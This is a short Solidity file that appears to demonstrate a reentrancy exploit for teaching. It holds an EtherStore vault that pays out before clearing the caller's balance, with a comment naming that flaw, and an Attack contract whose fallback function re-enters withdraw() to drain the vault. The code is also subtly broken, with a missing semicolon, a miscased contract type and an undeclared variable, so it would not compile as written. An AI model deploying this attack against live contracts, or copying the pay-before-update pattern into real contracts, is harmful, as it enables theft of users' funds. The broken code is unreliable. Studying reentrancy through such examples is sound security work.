// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }  

    function withdraw() public {
        uint bal = balances[msg.sender]
        require(bal>0);
        (bool sent, ) =msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0; //The error is here, this mapping should be updated before calling withdraw
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
contract Attack {
    EtherStore public etherStore;

    constructor(address _ethersStoreAddress) {
        etherStore = etherStore(_ethersStoreAddress);

    }
    //when etherstore sends ether after executing withdraw, this function will be called, calling withdraw again without updating the balances array
    fallback() external payable {
        if (address(etherstore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}


